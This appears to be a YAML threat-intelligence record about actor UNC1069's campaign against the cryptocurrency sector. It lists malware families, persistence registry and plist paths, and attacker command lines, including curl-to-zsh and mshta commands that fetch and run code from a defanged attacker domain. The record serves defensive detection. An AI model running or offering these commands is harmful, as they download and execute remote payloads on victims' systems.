description: UNC1069 targets cryptocurrency sector using AI-enabled social engineering
  with new malware families including SILENCELIFT, DEEPBREATH, and CHROMEPUSH.
attribution: UNC1069
malware_families:
- SUGARLOADER
- WAVESHAPER
- HYPERCALL
- HIDDENCALL
- DEEPBREATH
- CHROMEPUSH
- SILENCELIFT
TTPs:
  processes:
  - system_profiler
  - softwareupdate
  - zsh
  - setx
  - pnputil
  - mshta
  - wmic
  - msdt
  - XProtect
  - curl
  - /Library/OSRecovery/SystemUpdater
  - SystemUpdater
  - LibraryUpdater
  - Google Chrome Docs
  - Brave Browser Docs
  commandline:
  - system_profiler SPAudioData
  - softwareupdate --evaluate-products --products audio --agree-to-license
  - curl -A audio -s hxxp://mylingocoin[.]com/audio/fix/6454694440 | zsh
  - setx audio_volume 100
  - pnputil /enum-devices /connected /class "Audio"
  - mshta hxxp://mylingocoin[.]com/audio/fix/6454694440
  - wmic sounddev get Caption, ProductName, DeviceID, Status
  - msdt -id AudioPlaybackDiagnostic
  - /Library/OSRecovery/SystemUpdater
  - /usr/libexec/PlistBuddy -c "print :IOConsoleUsers:0:CGSSessionScreenIsLocked\" /dev/stdin 2>/dev/null <<< \"$(ioreg -n Root -d1 -a)\"
  - pkill -CONT -f
  - pkill -STOP -f
  - /usr/libexec/PlistBuddy -c "print :IOConsoleUsers:0:CGSSessionScreenIsLocked" /dev/stdin 2>/dev/null <<< "$(ioreg -n Root -d1 -a)"
  powershell: []
  scripting_engine:
  - AppleScript
  registry_keys:
  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
  - /Library/LaunchDaemons/com.apple.system.updater.plist
  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run
  image_load:
  - /tmp/\.[A-Za-z0-9]{6}.
  - NSCreateObjectFileImageFromMemory-[A-Za-z0-9]{8}
  - /inject_mac/inject.go
  - /Library/Caches/.Logs.db
  - /usr/lib/libcurl.4.dylib
  network_connections:
